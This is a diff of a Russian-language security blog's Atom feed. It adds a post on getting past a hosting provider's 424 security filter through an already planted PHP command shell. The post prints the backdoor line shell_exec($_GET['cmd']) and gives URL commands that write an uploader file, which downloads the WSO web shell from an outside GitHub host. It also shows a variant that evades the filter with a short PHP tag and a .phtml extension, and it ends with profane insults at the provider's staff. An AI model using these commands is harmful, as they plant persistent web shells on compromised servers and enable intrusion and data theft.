@@ -4,7 +4,7 @@
   <title><![CDATA[Security Idot]]></title>
   <link href="http://foozzi.github.io/atom.xml" rel="self"/>
   <link href="http://foozzi.github.io/"/>
-  <updated>2017-06-26T10:59:24+00:00</updated>
+  <updated>2017-06-26T16:43:06+00:00</updated>
   <id>http://foozzi.github.io/</id>
   <author>
     <name><![CDATA[foozzi]]></name>
@@ -12,6 +12,85 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Обход '424 Failed Dependency' на хостингах ukraine.com.ua]]></title>
+    <link href="http://foozzi.github.io/blog/2017/06/26/obkhod-424-failed-dependency-na-khostinghakh-ukraine-dot-com-dot-ua/"/>
+    <updated>2017-06-26T16:23:58+00:00</updated>
+    <id>http://foozzi.github.io/blog/2017/06/26/obkhod-424-failed-dependency-na-khostinghakh-ukraine-dot-com-dot-ua</id>
+    <content type="html"><![CDATA[<p>Или почему специалисты ukraine.com.ua - идиоты.</p>
+
+<p>Сегодня столкнулся с проблемой при попытке взаимодействовать через мини-шелл с файлами на
+сервере, все это на хостинге <strong>ukraine.com.ua</strong>, а именно:</p>
+
+<ul>
+<li>Нельзя использовать <strong>cat</strong> для просмотра содержимого файлов</li>
+<li>Использовать <strong>rm</strong>, <strong>echo</strong> и подобное</li>
+<li>Команды в адресной строке типа site.ru/shell.php?cmd=echo &lsquo;нужный код&rsquo; > file.php,
+например для загрузки того же <strong>wso</strong>, не проканает и выдаст <strong>424</strong> ошибку безопасности.</li>
+</ul>
+
+
+<h2>Проблема</h2>
+
+<p> Например у меня есть зараженный файл со строкой:
+ <code>php
+echo shell_exec($_GET['cmd']);
+</code>
+ что позволяет казалось бы, спокойно работать с сервером напрямую, но &ldquo;гениальность&rdquo;
+админов ukraine.com.ua работает на злоумышлинника ;)</p>
+
+<p>Чем просмотреть файл? В <strong>*nix</strong> подобных системах, есть еще
+<a href="https://en.wikipedia.org/wiki/Less_%28Unix%29">less</a>, который вполне (и даже в чем то
+лучше) заменит <strong>cat</strong>.</p>
+
+<p>Чем заменить <strong>echo</strong>, а вот тут есть <strong>printf</strong>, который работает аналогично в нашем
+случае:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">printf</span> <span class="s1">&#39;some code&#39;</span> &gt; file.php
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Как залить к примеру,
+<a href="https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php">wso</a>?
+Казалось бы, ничего сложного:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://site.ru/shell.php?cmd<span class="o">=</span><span class="nb">printf</span> <span class="s2">&quot;&lt;?php file_put_contents(&#39;wso.php&#39;, </span>
+</span><span class='line'><span class="s2">file_get_contents(&#39;https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php&#39;)); </span>
+</span><span class='line'><span class="s2">?&gt;&quot;</span> &gt; ../../site.ru/uploader_shell.php
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>То есть записываем в файл <strong>uploader_shell.php</strong> php код который скачает и сохранит файл
+шелла. Но при таком подходе нас пошлют в <strong>424</strong>ю ошибку, во первых, хотя бы потому, что в
+строке есть <strong>.php</strong>, и <strong>php4</strong>, <strong>php5</strong> не прокатят, а так же есть <strong>&lt;?php</strong>, что дает
+понять, что кто то замыслил что то плохое ;)</p>
+
+<h2>Решение</h2>
+
+<p>Тут далеко ходить не нужно:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://site.ru/shell.php?cmd<span class="o">=</span><span class="nb">printf</span> <span class="s2">&quot;&lt;?file_put_contents(&#39;wso.phtml&#39;, </span>
+</span><span class='line'><span class="s2">file_get_contents(&#39;https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php&#39;));?&gt;&quot;</span>
+</span><span class='line'>&gt; ../../site.ru/uploader_shell.php
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Таким образом мы все же создали загрузчик шелла <strong>uploader_shell.php</strong>, теперь просто стоит
+его вызвать из адресной строки и он сохранит шелл рядом <strong>wso.php</strong>.</p>
+
+<h2>Вывод</h2>
+
+<p>Тех. специалисты ukraine.com.ua еще те идиоты. Лучше бы и не выебываелись.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Обенники, котовые вы любите]]></title>
